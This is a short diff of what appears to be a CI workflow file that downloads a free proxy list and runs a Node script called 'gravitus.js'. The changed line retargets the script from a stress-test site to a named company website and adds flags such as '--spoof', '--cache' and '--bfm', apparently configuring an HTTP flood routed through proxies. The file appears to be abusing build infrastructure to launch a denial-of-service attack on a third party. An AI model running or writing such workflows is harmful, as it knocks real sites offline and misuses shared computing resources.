@@ -54,4 +54,4 @@ jobs:
            cd Gravitus
            wget -O proxy.txt "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=100&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
            python3 install.py
-           node gravitus.js https://dstat.returnstress.st/ 60000 30 10 proxy.txt
+           node gravitus.js https://synapsesoftworks.llc/ 60000 30 10 proxy.txt --bfm --cache --spoof --ratelimit
